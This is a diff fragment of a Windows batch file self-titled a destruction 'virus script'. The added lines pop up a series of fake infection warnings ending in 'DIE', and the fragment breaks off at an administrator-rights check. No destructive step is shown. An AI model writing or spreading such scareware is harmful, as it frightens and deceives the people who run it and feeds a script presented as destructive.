@@ -1,6 +1,23 @@
 @echo off
 title Ultimate Destruction and Fun Virus Script
 
+@echo off
+echo x=msgbox("CLICK OK IF YOU WANT VIRUS CLICK CANCEL IF YOU DONT WANT VIRUS", 1, "VIRUS INFECTION WARNING") > msgbox.vbs
+start msgbox.vbs
+timeout /t 2 /nobreak >nul
+
+echo x=msgbox("ARE YOU SURE!", 32, "VIRUS INFECTION WARNING") > msgbox.vbs
+start msgbox.vbs
+timeout /t 2 /nobreak >nul
+
+echo x=msgbox("LAST WARNING", 32, "VIRUS INFECTION WARNING") > msgbox.vbs
+start msgbox.vbs
+timeout /t 2 /nobreak >nul
+
+echo x=msgbox("DIE", 0, "DEATH IS NEAR") > msgbox.vbs
+start msgbox.vbs
+
+
 :adminCheck
 net session >nul 2>&1
 if %errorLevel% == 0 (
